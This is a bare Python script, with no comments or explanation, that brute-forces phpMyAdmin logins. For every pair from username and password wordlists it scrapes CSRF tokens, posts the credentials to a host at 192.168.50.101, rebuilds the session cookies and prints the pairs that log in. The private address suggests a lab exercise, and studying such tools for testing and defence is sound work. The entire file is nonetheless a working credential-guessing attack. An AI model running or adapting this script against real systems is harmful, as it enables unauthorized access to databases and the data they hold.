import http.client, urllib.parse, re 

lista_username = open("usernames.lst")
lista_password = open("passwords.lst")

user = lista_username.readlines()     
password = lista_password.readlines()  

for usr in user:
    usr = usr.rstrip()
    for pwd in password:

        pwd = pwd.rstrip()

        conn = http.client.HTTPConnection("192.168.50.101")  
        conn.request("GET", "/phpMyAdmin/index.php")
        
        response = conn.getresponse()
        page_content = response.read().decode()

        pattern = r'name="token" value="(\w+)"'
        match = re.search(pattern, page_content)
        token = match.group(1)
        pattern = r'name="phpMyAdmin" value="(\w+)"'
        match = re.search(pattern, page_content)
        phpMyAdmin_token = match.group(1)

        post_parameters = urllib.parse.urlencode({'phpMyAdmin':phpMyAdmin_token, 'pma_username': usr, 'pma_password': pwd, 'server':'1','token':token})  
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml"} 

        conn.request("POST", "/phpMyAdmin/index.php", post_parameters, headers)

        response = conn.getresponse()
        response.read().decode()
        set_cookie_header = response.getheaders()
        dest_cookie = []
        for cookie in set_cookie_header:
            if cookie[0] == 'Set-Cookie':
                dest_cookie.append(cookie[1].split(";")[0])
        
        cookie_def = 'phpMyAdmin='+phpMyAdmin_token+';'+dest_cookie[1]+';'+dest_cookie[2]+';'+dest_cookie[5]+';'+dest_cookie[6]+';'+dest_cookie[4]

        post_parameters = urllib.parse.urlencode({'token':token})
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':cookie_def} 
        url_php_bf = '/phpMyAdmin/index.php'
        url_target = url_php_bf + '?' + post_parameters

        conn.request("GET", url_target, post_parameters, headers)
        response = conn.getresponse()
        data = response.read().decode()

        if f"navigation.php?token={token}" in str(data):
            print("Logged with: ", usr, " - ",pwd)
        conn.close()
        
